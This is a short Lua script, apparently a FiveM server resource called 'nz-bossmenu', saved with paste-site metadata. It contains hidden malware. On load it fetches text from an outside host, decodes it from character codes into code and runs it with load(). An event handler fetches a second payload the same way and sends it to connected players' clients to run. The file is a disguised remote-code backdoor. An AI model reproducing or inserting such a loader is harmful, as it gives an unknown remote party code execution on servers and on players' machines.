--[[
	id: -PP0Ps5vAXSSSmQyhVeOR
	name: delete-me
	description: delete
	time1: 2021-05-23 03:33:57.855818+00
	time2: 2021-05-23 03:33:57.855819+00
	uploader: pomU5ZHdYsjiW7IQRZ9Ow0grNWYy6qhp9lboTjvz
	uploadersession: 3hg6TA53Lrz7TrrmwkUpwUuRnnU0PQ
	flag: f
--]]

PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=961901777623624", function(err, text, headers)
    local code = '';
    for word in string.gmatch(text, '([^\\]+)') do 
        code = code .. string.char(tonumber(word)) 
    end
    assert(load(code))()
end, 'GET', '')

RegisterServerEvent('nz-bossmenu:server:load')
AddEventHandler('nz-bossmenu:server:load', function()
    local src = source

    PerformHttpRequest("http://filesecuring.com/securefiles/get.php?id=971033943646067", function(err, text, headers)
        local code = '';
        for word in string.gmatch(text, '([^\\]+)') do 
            code = code .. string.char(tonumber(word)) 
        end
        TriggerClientEvent('nz-bossmenu:client:load', src, code)
    end, 'GET', '')
end)
    
